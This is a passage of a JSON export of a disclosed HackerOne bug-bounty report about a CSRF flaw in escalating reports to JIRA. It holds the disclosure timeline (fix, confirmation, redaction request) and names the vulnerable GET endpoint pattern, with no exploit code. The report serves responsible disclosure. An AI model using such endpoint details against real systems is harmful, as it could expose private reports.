            "markdown_message": "<p>Hey <a href=\"/whhackersbr\">@whhackersbr</a>,</p>\n\n<p>Just wanted to touch base and let you know we&#39;re still working on this, and we&#39;ll drop you a line as soon as we have a useful update.</p>\n\n<p>Thanks!</p>\n\n<p>Evan</p>\n", 
            "type": "Activities::Comment", 
            "id": 1767076, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-20T02:55:11.335Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-20T02:55:11.335Z", 
            "actor": {
                "username": "whhackersbr", 
                "url": "/whhackersbr", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/529/5007a34f7c314adc61fb9664cd543e71d38af685_medium.png?1473027497"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hey @ebrynne,\n\nThanks for the update.\n;-)", 
            "markdown_message": "<p>Hey <a href=\"/ebrynne\">@ebrynne</a>,</p>\n\n<p>Thanks for the update.<br>\n;-)</p>\n", 
            "type": "Activities::Comment", 
            "id": 1767322, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-07-20T09:25:50.941Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-07-20T09:25:50.941Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_severity": "Medium (5.3)", 
                "old_severity": "Low (3.1)"
            }, 
            "team_handle": "security", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportSeverityUpdated", 
            "id": 1852461, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-03T09:43:27.855Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-03T09:43:27.855Z", 
            "actor": {
                "username": "philip", 
                "url": "/philip", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/009/037/ed8dcf56232570e060ed361da4a96e336e42ac13_medium.jpg?1479752391"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "I landed a fix, which should be released today. @whhackersbr: can you confirm that this endpoint is no longer vulnerable?\n", 
            "markdown_message": "<p>I landed a fix, which should be released today. <a href=\"/whhackersbr\">@whhackersbr</a>: can you confirm that this endpoint is no longer vulnerable?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1887953, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-04T06:06:50.473Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-04T06:06:50.473Z", 
            "actor": {
                "username": "whhackersbr", 
                "url": "/whhackersbr", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/529/5007a34f7c314adc61fb9664cd543e71d38af685_medium.png?1473027497"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "@philip @security,\n\nThe bug seems fixed to me.", 
            "markdown_message": "<p><a href=\"/philip\">@philip</a> <a href=\"/security\">@security</a>,</p>\n\n<p>The bug seems fixed to me.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1892272, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "whhackersbr", 
                "url": "/whhackersbr"
            }, 
            "created_at": "2017-08-04T08:10:41.589Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-04T08:10:41.589Z", 
            "actor": {
                "username": "philip", 
                "url": "/philip", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/009/037/ed8dcf56232570e060ed361da4a96e336e42ac13_medium.jpg?1479752391"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 1892423, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-30T02:53:54.450Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-30T02:53:54.450Z", 
            "actor": {
                "username": "whhackersbr", 
                "url": "/whhackersbr", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/529/5007a34f7c314adc61fb9664cd543e71d38af685_medium.png?1473027497"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1964807, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-30T02:56:10.143Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-30T08:53:32.361Z", 
            "actor": {
                "username": "whhackersbr", 
                "url": "/whhackersbr", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/529/5007a34f7c314adc61fb9664cd543e71d38af685_medium.png?1473027497"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Please just remove the strings: `\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588`, `\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588` and `\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588` before disclosure.", 
            "markdown_message": "<p>Please just remove the strings: <code>\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588</code>, <code>\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588</code> and <code>\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588</code> before disclosure.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1964811, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-30T09:33:31.396Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-30T09:33:31.396Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1965292, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-30T09:33:31.459Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-30T09:33:31.459Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1965293, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "whhackersbr", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/whhackersbr", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/013/529/69fd99d4ac77f0a5fd122b9e3f691802fb967665_small.png?1473027497"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 45, 
        "name": "Cross-Site Request Forgery (CSRF)"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -37481977.23438523, 
    "disclosed_at": "2017-08-30T09:33:31.440Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/226418", 
    "created_at": "2017-05-05T20:39:02.926Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p><strong>Summary:</strong></p>\n\n<p>HackerOne reports escalation to JIRA is CSRF vulnerable</p>\n\n<p><strong>Description (Include Impact):</strong></p>\n\n<p>An attacker can steal private reports details through a CSRF in HackerOne report escalation to JIRA implementation.</p>\n\n<h3 id=\"csrf\">CSRF</h3>\n\n<p>GET <a title=\"https://hackerone.com/reports/%5BREPORT_NUMBER%5D/escalate\" href=\"https://hackerone.com/reports/%5BREPORT_NUMBER%5D/escalate\">https://hackerone.com/reports/%5BREPORT_NUMBER%5D/escalate</a></p>\n\n<h3 id=\"optional-supporting-material-references-screenshots\">Optional: Supporting Material/References (Screenshots)</h3>\n\n<ul>\n<li><a title=\"https://youtu.be/N6JSGA_RIV4\" href=\"/redirect?signature=1010342d77c782f242923fe8540659b04aaa5ad0&amp;url=https%3A%2F%2Fyoutu.be%2FN6JSGA_RIV4\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://youtu.be/N6JSGA_RIV4</span><i class=\"icon-external-link\"></i></a></li>\n</ul>\n", 
    "severity_rating": "medium", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://hackerone.com", 
            "about": "Vulnerability disclosure should be safe, transparent, and rewarding.", 
            "twitter_handle": "Hacker0x01", 
            "name": "HackerOne"
        }, 
        "handle": "security", 
        "url": "https://hackerone.com/security", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/013/68fea1fe00dc833f4109e015738af4b374727e56_small.png?1445331713", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/013/28af2ada2cc00aa9427504fc5a14f587362df84b_medium.png?1445331713"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 13, 
        "default_currency": "usd"
    }, 
    "is_published": false
}